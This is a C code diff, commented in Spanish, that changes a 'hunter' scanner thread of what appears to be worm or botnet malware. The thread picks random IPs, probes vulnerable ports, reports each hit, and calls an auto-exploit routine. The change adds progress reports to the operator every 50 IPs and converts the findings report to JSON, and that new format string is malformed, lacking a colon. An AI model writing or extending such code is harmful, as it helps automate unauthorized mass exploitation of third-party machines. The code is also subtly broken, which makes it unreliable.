@@ -235,6 +235,7 @@ void *hunter_scanner_thread(void *arg) {
     
     char ip[16];
     HunterTarget target;
+    int batch_count = 0;
     
     while (1) {
         // Genera IP aleatoria
@@ -242,7 +243,17 @@ void *hunter_scanner_thread(void *arg) {
         
         pthread_mutex_lock(&hunter_mutex);
         hunter_stats.ips_scanned++;
+        batch_count++;
         pthread_mutex_unlock(&hunter_mutex);
+        
+        // Reportar progreso cada 50 IPs
+        if (batch_count >= 50) {
+            char progress[128];
+            snprintf(progress, sizeof(progress), 
+                "{\"type\":\"hunter_scan\",\"scanned\":%d}", batch_count);
+            send_report("hunter_scan", progress);
+            batch_count = 0;
+        }
         
         // Escanea puertos vulnerables
         for (int i = 0; hunter_ports[i] != 0; i++) {
@@ -267,9 +278,9 @@ void *hunter_scanner_thread(void *arg) {
                 // Reportar hallazgo
                 char report[256];
                 snprintf(report, sizeof(report), 
-                    "🔍 FOUND: %s:%d (%s)", 
+                    "{\"type\":\"hunter_found\",\"target\"\"%s:%d (%s)\"}", 
                     target.ip, target.port, target.service);
-                send_report("hunter_find", report);
+                send_report("hunter_found", report);
                 
                 // Intentar explotar
                 auto_exploit_target(&target);
